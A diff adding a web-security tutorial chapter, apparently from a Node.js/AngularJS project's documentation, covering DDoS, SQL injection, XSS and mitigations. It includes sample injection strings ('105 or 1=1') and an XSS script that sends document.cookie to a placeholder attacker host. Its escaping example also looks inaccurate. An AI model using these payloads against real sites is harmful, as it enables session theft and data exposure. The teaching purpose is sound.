@@ -1,1 +1,141 @@
-<p>Hello Chapter 05!</p>
+<p><b>"Security" is a big topic</b></p>
+
+<p>It's all about attack and defense. If you were not attacked before, you never understood "security".
+   Enterprise IT have little knowledge about security just because they have little chance to be attacked.
+   Most of the enterprise applications are living inside the wall, they are protected not to be accessed
+   through internet. But things are changing, we must have the ability to live off the wall.
+</p>
+
+<p>Knowing how to defend is more difficult than knowing how to attack. There is no universal panacea for
+    all kinds of attacks. You must have a solid technique background knowing how to deal with a situation.
+    Besides, you should also know the game rules of internet.
+</p>
+
+<p> In chapter 03, we have talked about user authentication and authorization. It is part of security technology,
+    but only protect the system resource from being misused. The target group are ordinary users
+    who are not professional at IT. In this chapter, we will focus on the malicious attacks by hackers,
+    and the evil inside of internet.
+    I will talk about specific attack methods and the defend solution so far I know.
+    As I said at the beginning: "Security is a big topic". I hope we can continuous improve and extend this chapter
+    during our sailing on internet.
+</p>
+
+
+<b>Distributed Denial-of-Service(DDoS)</b>
+<p>The attack is attempt to make a network resource unavailable by saturating the target web server with external
+communications requests, so much so that it cannot respond to legitimate traffic, or response so slowly as to be
+rendered essentially unavailable.</p>
+ <img src="images/DDoS.jpg" class="img-responsive">
+<p>Above image demonstrate a DDoS tool's panel. It consists of top panel for listing the connected bots,
+a bottom tabbed interface for task information, and subsequent tabs for different types of DDoS payloads it supports.
+You will find how easy it is to raise a DDoS attack using this tool. It is reported, there is a raising trend in botnet who
+has targeted Linux servers primarily, but is now diversifying and targeting Windows hosts, router, CPE and ARM-compatible
+Linux distributions as well. DDoS attackers can gain additional resources by extending the range of devices
+that can be harnessed by a botnet.</p>
+
+<p>The general idea to mitigate DDoS attacks is to identify the illegitimate and legitimate traffics, and filter the illegitimates.
+    Most of the IaaS/PaaS providers have integrated such kind of tools. For example, AWS will active "blackholing"
+    when it identifies massive traffic blocking.
+    With blackholing, all the traffic(include the legitimates) to the attacked DNS or IP address is sent to a "black hole"
+    (null interface or a non-existence server).
+
+    <br>
+    I like this word:
+    <b>Please do not put yourself in spotlight before you get stronger.</b>
+</p>
+
+<b>SQL Injection</b>
+<p>
+    SQL injection is a technique where malicious users can inject SQL commands into an SQL statement,
+    via web page input. Injected SQL commands can alter SQL statement and compromise the security of a web application.
+</p>
+<p>
+Server Code:
+<pre>
+  txtUserId = getRequestString("UserId");
+  txtSQL = "SELECT * FROM Users WHERE UserId = " + txtUserId;
+</pre>
+The example above, creates a select statement by adding a variable (txtUserId) to a select string.
+The variable is fetched from the user input (Request) to the page.<br>
+The original purpose of the code was to create an SQL statement to select a user with a given user id.
+If there is nothing to prevent a user from entering "wrong" input, the user can enter some "smart" input like this:<br>
+<label>User ID:</label></a><input type="text" name="UserId" value="105 or 1=1"><br>
+Server Result:
+<pre>
+    SELECT * FROM Users WHERE UserId = 105 or 1=1
+</pre>
+The SQL above is valid. It will return all rows from the table Users, since <b>WHERE 1=1</b> is always true.
+Does the example above seem dangerous? What if the Users table contains names and passwords?
+</p>
+<p>How DarkHouse mitigates SQL injection?
+<li>
+    Pattern Check: assign "type" attribute in &lt;input&gt; element. Email, Password, Integer, float or boolean parameters
+    can be checked if their value is valid representation for the give type.
+    <img src="images/html_input_type.jpg" class="img-responsive">
+    You can also assign your own pattern based on regular expression using AngularJS.
+</li>
+<li>
+    Escaping: Always escape any user provided data before using it inside a SQL query.
+    <img src="images/sql_escape.jpg" class="img-responsive">
+    The method "pool.escape()" escapes characters that have a special meaning in SQL. For instance:
+    <pre>' or 1 = 1 --</pre> will be escaped to <pre>'/' or 1 = 1 /-/-'</pre>
+</li>
+<li>
+    Database permissions: Limiting the permissions on the database logon used by the
+    web application to only what is needed may help reduce the effectiveness of any SQL injection attacks
+    that exploit any bugs in the web application.
+    <pre>
+deny select on sys.sysobjects to webdatabaselogon;
+deny select on sys.objects to webdatabaselogon;
+deny select on sys.tables to webdatabaselogon;
+deny select on sys.views to webdatabaselogon;
+deny select on sys.packages to webdatabaselogon;
+    </pre>
+</li>
+</p>
+
+<br>
+<b>Cross-site Scripting(XSS)</b>
+<p>
+    XSS enables attackers to inject client-side script(JavaScript) into Web pages viewed by other users.
+    For example: a web server has a guestbook script, which accepts small messages from users,
+    and typically receives messages such as
+    <pre>Very nice site!</pre>
+    However a malicious person may know of a code injection vulnerability in the guestbook,
+    and enters a message such as
+    <pre>Nice site,  I think I'll take it.
+ &lt;script&gt;document.location="http://some_attacker/cookie.cgi?" + document.cookie&lt;/script&gt;</pre>
+    If another user views the page then the injected code will be executed.
+    This code can allow the attacker to impersonate another user.
+    However this same software bug can be accidentally triggered by an unassuming user which will cause
+    the website to display bad HTML code.
+</p>
+
+<p>Although AngularJS helps us to mitigate most of the XSS attacks, but we still need be aware of it.
+    Cross-site scripting carried out on websites accounted for roughly <b>84%</b> of all security vulnerabilities
+    documented by Symantec as of 2007.
+   <blockquote>
+    Like any other technology, AngularJS is not impervious to attack. Angular does,
+    however, provide built-in protection from basic security holes including cross-site scripting and
+    HTML injection attacks. AngularJS does round-trip escaping on all strings for you and even offers
+    XSRF protection for server-side communication.
+
+    AngularJS was designed to be compatible with other security measures like Content Security Policy (CSP),
+    HTTPS (SSL/TLS) and server-side authentication and authorization that greatly reduce the possible attack
+    vectors and we highly recommended their use.
+   </blockquote>
+</p>
+
+<b>Server-Side JavaScript Injection</b>
+<p>
+  JavaScript is not just for client-side code, but for server-side code as well. DarkHouse is totally based on
+    Node.js. And how to mitigate the Server-Side JavaScript Injection?
+  Here is a good <a href="docs/server_side_wp.pdf" target="_blank">thesis</a> by Adobe Secure Software Engineering Team.
+</p>
+
+<p>
+  Before end this chapter, please be advised, you should by all means use HTTPS for secure communication.
+  DarkHouse will soon find a way to adopt HTTPS on Node.js. OK, let's now go to chapter 06: the
+  <a ng-click="openAccordionGroup(6)"> "UI part"</a>.
+</p>
+
